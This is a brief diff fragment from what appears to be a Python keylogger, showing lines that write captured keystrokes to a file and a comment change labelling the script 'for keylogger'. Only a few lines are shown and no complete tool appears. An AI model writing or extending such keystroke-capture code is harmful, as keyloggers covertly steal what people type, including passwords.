@@ -7,4 +7,5 @@ while True:
 		rf = str(r) + str(keytolog)
 		f.write(rf)
 input()
-# this needs sudo xP. ok. make a READMEFISRT.py ill make that ok
+
+# Run ir for keylogger
